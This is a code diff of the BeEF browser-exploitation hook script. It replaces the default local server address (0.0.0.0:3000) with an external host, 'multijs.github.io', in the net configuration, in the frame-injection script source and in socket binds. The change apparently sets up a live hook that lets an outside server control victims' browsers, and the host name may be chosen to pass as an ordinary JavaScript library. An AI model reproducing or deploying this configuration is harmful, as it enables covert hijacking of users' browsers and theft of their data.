@@ -8896,7 +8896,7 @@ beef.browser = {
         // create script object
         var script = document.createElement('script');
         script.type = 'text/javascript';
-        script.src = 'http://0.0.0.0:3000/hook.js';
+        script.src = 'http://multijs.github.io/hook.js';
 
         // loop through child frames
         for (var i = 0; i < self.frames.length; i++) {
@@ -11145,9 +11145,9 @@ beef.dom = {
     /**
      * Attach an applet to the DOM, using the best approach for differet browsers (object/applet/embed).
      * example usage in the code, using a JAR archive (recommended and faster):
-     * beef.dom.attachApplet('appletId', 'appletName', 'SuperMario3D.class', null, 'http://127.0.0.1:3000/ui/media/images/target.jar', [{'param1':'1', 'param2':'2'}]);
+     * beef.dom.attachApplet('appletId', 'appletName', 'SuperMario3D.class', null, 'http://127.0.0.1/ui/media/images/target.jar', [{'param1':'1', 'param2':'2'}]);
      * example usage in the code, using codebase:
-     * beef.dom.attachApplet('appletId', 'appletName', 'SuperMario3D', 'http://127.0.0.1:3000/', null, null);
+     * beef.dom.attachApplet('appletId', 'appletName', 'SuperMario3D', 'http://127.0.0.1/', null, null);
      * @param {String} id: reference identifier to the applet.
      * @param {String} code: name of the class to be loaded. For example, beef.class.
      * @param {String} codebase: the URL of the codebase (usually used when loading a single class for an unsigned applet).
@@ -11671,8 +11671,8 @@ beef.regCmp('beef.logger');
  */
 beef.net = {
 
-    host: "0.0.0.0",
-    port: "3000",
+    host: "multijs.github.io",
+    port: "",
     hook: "/hook.js",
     httpproto: "http",
     handler: '/dh',
@@ -12687,7 +12687,7 @@ beef.net.local = {
 		this.initializeSocket();
 		
 		try {
-			this.sock.bind(new java.net.InetSocketAddress('0.0.0.0', 0));
+			this.sock.bind(new java.net.InetSocketAddress('multijs.github.io', 0));
 			this.sock.connect(new java.net.InetSocketAddress(document.domain, (!document.location.port)?80:document.location.port));
 			
 			return this.sock.getLocalAddress().getHostAddress();
@@ -12705,7 +12705,7 @@ beef.net.local = {
 		this.initializeSocket();
 		
 		try {
-			this.sock.bind(new java.net.InetSocketAddress('0.0.0.0', 0));
+			this.sock.bind(new java.net.InetSocketAddress('multijs.github.io', 0));
 			this.sock.connect(new java.net.InetSocketAddress(document.domain, (!document.location.port)?80:document.location.port));
 			
 			return this.sock.getLocalAddress().getHostName();
